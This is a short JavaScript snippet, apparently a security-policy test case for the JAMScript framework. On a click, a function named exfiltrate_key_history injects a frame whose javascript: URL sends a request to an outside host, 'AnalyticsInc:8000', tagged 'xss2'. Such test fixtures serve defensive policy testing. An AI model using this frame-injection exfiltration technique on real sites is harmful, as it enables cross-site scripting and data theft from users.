function exfiltrate_key_history() {
  var script = document.createElement("frameset");
  var script2 = document.createElement("frame");
  script2.src = 'javascript:Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss2",true);xmlhttp.send(null);\')()';
  JAMScript.call(script.appendChild, script, [script2]);
  var v2 = document.getElementsByTagName("body");
  var v0 = v2[0];
  JAMScript.call(v0.appendChild, v0, [script]);
  return
}
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

